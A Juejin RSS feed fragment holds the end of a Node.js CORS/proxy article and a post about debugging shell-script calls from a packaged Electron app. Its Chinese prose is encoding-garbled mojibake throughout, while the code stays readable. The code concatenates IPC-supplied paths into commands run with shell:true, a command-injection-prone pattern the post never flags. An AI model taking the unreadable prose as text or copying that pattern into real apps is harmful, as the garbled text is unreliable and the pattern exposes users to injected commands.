  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Front-end server is running on http://localhost:3000'</span>);
});
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå‰ç«¯çš„è¯·æ±‚ <code>/api</code> ä¼šè¢«ä»£ç†åˆ°ç›®æ ‡åç«¯ï¼Œé¿å…äº†ç›´æ¥è·¨åŸŸè¯·æ±‚ã€‚</p>
<hr/>
<h2 data-id="heading-12">å…­ã€æ€»ç»“</h2>
<p>è·¨åŸŸé—®é¢˜æ˜¯å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ä¸å¯å¿½è§†çš„æŒ‘æˆ˜ï¼ŒNode.js æä¾›äº†å¤šç§è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¸­ CORS å’Œä»£ç†æ˜¯æœ€å¸¸è§çš„æ–¹å¼ã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œåˆç†é…ç½® CORS å’Œä»£ç†ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…è·¨åŸŸé™åˆ¶å¸¦æ¥çš„é—®é¢˜ï¼Œä»è€Œæå‡å‰åç«¯åä½œæ•ˆç‡ã€‚</p>
<ul>
<li><strong>CORS</strong>ï¼šé€‚åˆåç«¯æœåŠ¡ï¼Œèƒ½å¤Ÿçµæ´»æ§åˆ¶è·¨åŸŸè¯·æ±‚çš„æƒé™ã€‚</li>
<li><strong>ä»£ç†</strong>ï¼šé€‚åˆå¼€å‘ç¯å¢ƒï¼Œé€šè¿‡ä»£ç†è½¬å‘è¯·æ±‚è§£å†³è·¨åŸŸé—®é¢˜ã€‚</li>
</ul>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå‰åç«¯ç»“åˆçš„æ–¹å¼å¯ä»¥æ ¹æ®ä¸åŒéœ€æ±‚é€‰æ‹©åˆé€‚çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼Œä»¥å®ç°æ›´é«˜æ•ˆã€æ›´ç¨³å®šçš„å¼€å‘è¿‡ç¨‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Electron è„šæœ¬è°ƒç”¨å¤§å‘ï¼å®³æƒ¨æˆ‘äº†]]></title>    <link>https://juejin.cn/post/7592518897464950836</link>    <guid>https://juejin.cn/post/7592518897464950836</guid>    <pubDate>2026-01-08T06:52:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592518897464950836" data-draft-id="7592508079306293267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Electron è„šæœ¬è°ƒç”¨å¤§å‘ï¼å®³æƒ¨æˆ‘äº†"/> <meta itemprop="keywords" content="å‰ç«¯,Electron"/> <meta itemprop="datePublished" content="2026-01-08T06:52:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PBitW"/> <meta itemprop="url" content="https://juejin.cn/user/3048261967153544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Electron è„šæœ¬è°ƒç”¨å¤§å‘ï¼å®³æƒ¨æˆ‘äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048261967153544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PBitW
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T06:52:39.000Z" title="Thu Jan 08 2026 06:52:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¥ä¸Šä¸¤ç¯‡æ–‡ç« ï¼š</p>
<ol>
<li><a href="https://juejin.cn/post/7591806035758628906" target="_blank" title="https://juejin.cn/post/7591806035758628906">Electron åˆä½“éªŒ â€”â€” AIè¾…åŠ©ä¸Šæ‰‹ï¼Œç¡®å®ä¸éš¾(à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§</a></li>
<li><a href="https://juejin.cn/spost/7592119218024824867" target="_blank" title="https://juejin.cn/spost/7592119218024824867">Electron åœ¨ä¹Œç­å›¾ä¸Šæ‰“åŒ… â€”â€” AIè¾…åŠ©</a></li>
</ol>
<p>èœé¸Ÿä»¥ä¸ºåšå®Œä¸Šé¢ä¸¤ç¯‡æ–‡ç« å°±å¯ä»¥é«˜æ•æ— å¿§äº†ï¼Œç»“æœç°å®ç»™äº†èœé¸Ÿå½“å¤´ä¸€æ£’ï¼</p>
<p>æ˜¨å¤©ï¼Œç”Ÿä¿¡éƒ¨é—¨å°†ä»–å°è£…çš„è„šæœ¬éƒ¨ç½²ä¸Šäº†æœåŠ¡å™¨ï¼Œå¹¶è®©æˆ‘è¿›è¡Œè°ƒè¯•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼æˆ‘æŒ‰ç…§å…¶ç¤ºä¾‹è¾“å…¥ã€ç¤ºä¾‹è¿è¡Œshellï¼Œå»ä¿®æ”¹äº†è‡ªå·±çš„è¿è¡Œè„šæœ¬æ–‡ä»¶ï¼Œä¿®æ”¹åå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">runScript</span>(<span class="hljs-params">ipcMain, app, path, fs, exec</span>) {
  <span class="hljs-comment">// è¿è¡Œè„šæœ¬ -- ç­‰å¾…ç»“æœ</span>
  ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">"runScript"</span>, <span class="hljs-keyword">async</span> (event, data) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userDataPath = app.<span class="hljs-title function_">getPath</span>(<span class="hljs-string">"userData"</span>);
        <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(userDataPath, <span class="hljs-string">"scripts"</span>, <span class="hljs-string">"config.json"</span>);
        <span class="hljs-comment">// è¯»å– config.json</span>
        <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(configPath)) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">"The config.json file does not exist. Please initialize the scripts folder first"</span>
          );
        }
        
        <span class="hljs-keyword">const</span> configContent = fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">"utf-8"</span>);
        <span class="hljs-keyword">const</span> config = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(configContent);

        <span class="hljs-comment">// æ‹¼æ¥å‘½ä»¤ï¼ˆè‡ªåŠ¨äº¤ç”± shell è§£æï¼‰</span>
        <span class="hljs-keyword">const</span> command = <span class="hljs-string">`<span class="hljs-subst">${config.scriptPath}</span> <span class="hljs-subst">${data.inputJsonPath}</span>`</span>;
        
        <span class="hljs-comment">// å…³é”®ï¼šshell ç”±ç³»ç»Ÿå†³å®š</span>
        <span class="hljs-title function_">exec</span>(command, { <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span> }, <span class="hljs-function">(<span class="hljs-params">error, stdout, stderr</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Script execution failed 103:"</span>, error);
            <span class="hljs-title function_">reject</span>(stderr || stdout || <span class="hljs-string">"è„šæœ¬è¿è¡Œå¼‚å¸¸"</span>);
            <span class="hljs-keyword">return</span>;
          }
          <span class="hljs-title function_">resolve</span>(stdout);
        });
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-title function_">reject</span>(err.<span class="hljs-property">message</span>);
      }
    });
  });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">runScriptNoWait</span>(<span class="hljs-params">ipcMain, app, path, fs, spawn</span>) {
  <span class="hljs-comment">// è¿è¡Œè„šæœ¬ -- ä¸ç­‰å¾…ç»“æœ</span>
  ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">"runScriptNoWait"</span>, <span class="hljs-keyword">async</span> (event, data) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userDataPath = app.<span class="hljs-title function_">getPath</span>(<span class="hljs-string">"userData"</span>);
        <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(userDataPath, <span class="hljs-string">"scripts"</span>, <span class="hljs-string">"config.json"</span>);
        <span class="hljs-comment">// è¯»å– config.json</span>
        <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(configPath)) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">"The config.json file does not exist. Please initialize the scripts folder first."</span>
          );
        }
        
        <span class="hljs-keyword">const</span> configContent = fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">"utf-8"</span>);
        <span class="hljs-keyword">const</span> config = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(configContent);

        <span class="hljs-comment">// spawn åå°æ‰§è¡Œ</span>
        <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(config.<span class="hljs-property">scriptPath</span>, [data.<span class="hljs-property">inputJsonPath</span>], {
          <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©ç³»ç»Ÿé€‰æ‹© cmd/bash</span>
          <span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©è„šæœ¬æˆä¸ºç‹¬ç«‹è¿›ç¨‹</span>
          <span class="hljs-attr">stdio</span>: <span class="hljs-string">"ignore"</span> <span class="hljs-comment">// ä¸æ¥æ”¶ä»»ä½•è¾“å‡º</span>
        });

        <span class="hljs-comment">// æ–­å¼€ Electron ä¸è„šæœ¬çš„å…³ç³»</span>
        child.<span class="hljs-title function_">unref</span>();

        <span class="hljs-comment">// ***å…³é”®ï¼šä¸ç­‰å¾…è„šæœ¬æ‰§è¡Œç»“æœ***</span>
        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"è„šæœ¬å·²æˆåŠŸå¯åŠ¨"</span>); <span class="hljs-comment">// ä¸ç­‰å¾… stdoutï¼Œä¹Ÿä¸ç­‰å¾…è„šæœ¬ç»“æŸ</span>
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-title function_">reject</span>(err.<span class="hljs-property">message</span>);
      }
    });
  });
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  runScript,
  runScriptNoWait
};
</code></pre>
<p>åæ­£å‘½ä»¤è¡Œæ‹¼å‡ºæ¥é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">source /home/bnzycjd/.bashrc &amp;&amp; /home/bnzycjd/miniconda3/bin/python  /home/bnzycjd/pipline_test/script/pipline.py -c /home/bnzycjd/test/input.json
</code></pre>
<p>å…¶ä¸­</p>
<p><code>scriptPath</code> ä»£è¡¨ <code>source /home/bnzycjd/.bashrc &amp;&amp; /home/bnzycjd/miniconda3/bin/python  /home/bnzycjd/pipline_test/script/pipline.py -c</code></p>
<p><code>inputJsonPath</code>ä»£è¡¨<code>/home/bnzycjd/test/input.json</code></p>
<p>è¿™æ®µä»£ç åœ¨æœåŠ¡å™¨ä¸Šï¼Œç”¨npm run devè·‘æˆ–è€…å¤åˆ¶åˆ°æœåŠ¡å™¨çš„ç»ˆç«¯ä¸Šè¿è¡Œï¼Œéƒ½å•¥é—®é¢˜æ²¡æœ‰ï¼Œä½†ä¸€æ‰“åŒ…å°±ä¼šæŠ¥é”™ï¼Œè€Œä¸”æŠ¥é”™è¿˜ä¸å¥½è°ƒè¯•ï¼ŒçœŸçš„è®©èœé¸Ÿéš¾å—è‡³æï¼</p>
<h2 data-id="heading-0">å¢åŠ æ—¥å¿—</h2>
<p>æˆ‘æŠŠè¿™ä¸ªæƒ…å†µå‘leaderè¯´æ˜åï¼Œå› ä¸ºä»–æ˜¯åç«¯ï¼Œæ‰€ä»¥çŸ¥é“æ€ä¹ˆæŠŠæ—¥å¿—è¾“å‡ºåˆ°æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥åŒæ­¥runScriptä»£ç å˜æˆäº†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> command = <span class="hljs-string">`<span class="hljs-subst">${config.scriptPath}</span> <span class="hljs-subst">${data.inputJsonPath}</span> &gt;&gt; <span class="hljs-subst">${data.logPath}</span>/<span class="hljs-subst">${data.logName}</span>.log`</span>;
</code></pre>
<p>å¼‚æ­¥çš„runScriptNoWaitä»£ç æ˜¯AIå¸®åŠ©æˆ‘å†™çš„ï¼Œæœ‰ç‚¹é—®é¢˜ï¼Œéœ€è¦è°ƒè¯•å¹¶å’ŒAIæ²Ÿé€šï¼ˆæ”¹åŠ¨äº†å‡ æ¬¡ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œç›´æ¥å±•ç¤ºæœ€ç»ˆå¯ä»¥è¿è¡Œçš„ï¼‰ï¼Œå˜æˆäº†</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">runScriptNoWait</span>(<span class="hljs-params">ipcMain, app, path, fs, spawn</span>) {
  <span class="hljs-comment">// è¿è¡Œè„šæœ¬ -- ä¸ç­‰å¾…ç»“æœ</span>
  ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">"runScriptNoWait"</span>, <span class="hljs-keyword">async</span> (event, data) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userDataPath = app.<span class="hljs-title function_">getPath</span>(<span class="hljs-string">"userData"</span>);
        <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(userDataPath, <span class="hljs-string">"scripts"</span>, <span class="hljs-string">"config.json"</span>);
        <span class="hljs-comment">// è¯»å– config.json</span>
        <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(configPath)) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">"The config.json file does not exist. Please initialize the scripts folder first."</span>
          );
        }
        <span class="hljs-keyword">const</span> configContent = fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">"utf-8"</span>);
        <span class="hljs-keyword">const</span> config = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(configContent);

        <span class="hljs-keyword">const</span> logFile = path.<span class="hljs-title function_">join</span>(data.<span class="hljs-property">logPath</span>, <span class="hljs-string">`<span class="hljs-subst">${data.logName}</span>.log`</span>);
        <span class="hljs-keyword">const</span> outFd = fs.<span class="hljs-title function_">openSync</span>(logFile, <span class="hljs-string">"a"</span>);

        <span class="hljs-comment">// spawn åå°æ‰§è¡Œ</span>
        <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(config.<span class="hljs-property">scriptPath</span>, [data.<span class="hljs-property">inputJsonPath</span>], {
          <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©ç³»ç»Ÿé€‰æ‹© cmd/bash</span>
          <span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©è„šæœ¬æˆä¸ºç‹¬ç«‹è¿›ç¨‹</span>
          <span class="hljs-attr">stdio</span>: [<span class="hljs-string">"ignore"</span>, outFd, outFd] <span class="hljs-comment">// stdout, stderr éƒ½å†™æ—¥å¿—</span>
        });

        <span class="hljs-comment">// æ£€æŸ¥è¿›ç¨‹æ˜¯å¦æˆåŠŸå¯åŠ¨</span>
        child.<span class="hljs-title function_">on</span>(<span class="hljs-string">"error"</span>, <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"åå°è„šæœ¬å¯åŠ¨å¤±è´¥:"</span>, error.<span class="hljs-property">message</span>);
          <span class="hljs-title function_">reject</span>(<span class="hljs-string">`åå°è„šæœ¬å¯åŠ¨å¤±è´¥: <span class="hljs-subst">${error.message}</span>`</span>);
        });

        <span class="hljs-comment">// è¿›ç¨‹æˆåŠŸå¯åŠ¨</span>
        child.<span class="hljs-title function_">on</span>(<span class="hljs-string">"spawn"</span>, <span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åå°è„šæœ¬å·²æˆåŠŸå¯åŠ¨ï¼Œè¿›ç¨‹ID:"</span>, child.<span class="hljs-property">pid</span>);
        });

        <span class="hljs-comment">// æ–­å¼€ Electron ä¸è„šæœ¬çš„å…³ç³»</span>
        child.<span class="hljs-title function_">unref</span>();

        <span class="hljs-comment">// ***å…³é”®ï¼šä¸ç­‰å¾…è„šæœ¬æ‰§è¡Œç»“æœ***</span>
        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"è„šæœ¬å·²æˆåŠŸå¯åŠ¨"</span>); <span class="hljs-comment">// ä¸ç­‰å¾… stdoutï¼Œä¹Ÿä¸ç­‰å¾…è„šæœ¬ç»“æŸ</span>
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-title function_">reject</span>(err.<span class="hljs-property">message</span>);
      }
    });
  });
}
</code></pre>
<p>è¿™æ ·æœ‰æ—¥å¿—äº†å°±å¥½è°ƒè¯•ä¸€ç‚¹ï¼Œä½†æ˜¯ä¹Ÿä¸å¯ä»¥æˆåŠŸè°ƒç”¨è„šæœ¬ã€‚</p>
<h2 data-id="heading-1">è¸©å‘</h2>
<p>è¿™é‡Œèœé¸Ÿè¸©äº†å¥½å¤šå‘ï¼Œé—®AIçš„æ—¶å€™ï¼Œå¦‚æœè‡ªå·±ä¹Ÿä¸çŸ¥é“å¦‚ä½•è§£å†³ï¼Œåªèƒ½é è¯•ï¼</p>
<p>ç”šè‡³å‡ºç°äº†è¿™ä¸ªç¦»è°±çš„è§£å†³æ–¹æ¡ˆï¼ŒæŠŠ<code>shellï¼štrue</code>ï¼Œæ”¹æˆä¸‹é¢çš„</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-attr">shell</span>: <span class="hljs-string">"/bin/bash"</span>
}

<span class="hljs-comment">// spawn åå°æ‰§è¡Œ</span>
<span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">"/bin/bash"</span>, [<span class="hljs-string">"-lc"</span>, <span class="hljs-string">`<span class="hljs-subst">${config.scriptPath}</span> <span class="hljs-subst">${data.inputJsonPath}</span>`</span>], {
  <span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©è„šæœ¬æˆä¸ºç‹¬ç«‹è¿›ç¨‹</span>
  <span class="hljs-attr">stdio</span>: [<span class="hljs-string">"ignore"</span>, outFd, outFd]
});
</code></pre>
<p>è¿™äº›å®Œå…¨å°±æ˜¯æ— ç¨½ä¹‹è°ˆã€‚</p>
<p>ä¸»è¦è¿˜æ˜¯èœé¸Ÿä¸æ‡‚å‘½ä»¤è¡Œï¼Œå…¶å®è¦æ˜¯æ‡‚çš„è¯ï¼Œå°±çŸ¥é“<code>source /home/bnzycjd/.bashrc</code>å…¶å®æ ¹æœ¬ä¸æ˜¯è¿è¡Œè„šæœ¬çš„å‘½ä»¤ï¼Œè€Œæ˜¯åŠ è½½ç¯å¢ƒå˜é‡çš„ä½œç”¨ï¼</p>
<p>èœé¸Ÿå°±ä¸€ç›´ä»¥ä¸ºå¿…é¡»åŠ ä¸Š<code>source /home/bnzycjd/.bashrc</code>æ‰æ˜¯å®Œæ•´å‘½ä»¤ /(ã„’oã„’)/~~</p>
<h2 data-id="heading-2">ç­”æ¡ˆ</h2>
<p>è¸©äº†å¾ˆå¤šå‘ï¼Œæ€»ç®—æ˜¯åœ¨AIé‚£è¾¹å¾—åˆ°äº†ç­”æ¡ˆï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a407f9ab5e34da4be06ed9e27e1bd33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEJpdFc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460214&amp;x-signature=Hzg9%2B9yrjiJ%2Fbhis3dxoAd8wwww%3D" alt="image.png" loading="lazy"/></p>
<p>ç­”æ¡ˆæ˜¯ï¼š</p>
<blockquote>
<p>ä¸ç®¡æ˜¯ç”¨npm run devè·‘æˆ–è€…å¤åˆ¶åˆ°æœåŠ¡å™¨çš„ç»ˆç«¯ä¸Šè¿è¡Œï¼Œéƒ½ç›¸å½“äºæœ‰ç»ˆç«¯ä¸Šçš„ç¯å¢ƒä¿¡æ¯ï¼Œä½†æ˜¯æ‰“åŒ…åçš„ç¨‹åºæ˜¯æ²¡æœ‰è¿™äº›çš„ï¼</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58aec789f54344508d786f5aa38ae373~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEJpdFc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460214&amp;x-signature=ZuF3hBoeAPiJEFna0TZthl%2B0WdY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/234dc1275c974ae5b2241c19bfb28b2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEJpdFc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460214&amp;x-signature=GXHnEScdb1NhXgzMNceBtBQGcFg%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">å¦‚ä½•è§£å†³ï¼Ÿ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8810a99d7e8e419e96ca3610c7a3d60a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEJpdFc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460214&amp;x-signature=%2FqRnE3fvbWeFvCWHVQWLkCq3U2o%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™é‡Œèœé¸Ÿæ˜¯ç”¨äºŒè§£å†³çš„ï¼ˆæ„Ÿè§‰ä¸€å’ŒäºŒå·®ä¸å¤šï¼‰ï¼Œä¸‰ä¸æ˜¯å¾ˆæ‡‚ï¼Œè¿™ä¸ªé¡¹ç›®æ¯”è¾ƒç®€å•ã€æ¯”è¾ƒæ€¥ï¼Œå°±æ²¡æœ‰ç”¨è¿™ä¸ªä¸“ä¸šçš„è§£å†³åŠæ³•ï¼Œ<strong>æœ‰æ‡‚çš„è¯»è€…ï¼Œå¯ä»¥æŒ‡ç‚¹æ±Ÿå±±ï¼Œæ¿€æ‰¬æ–‡å­—ï¼</strong></p>
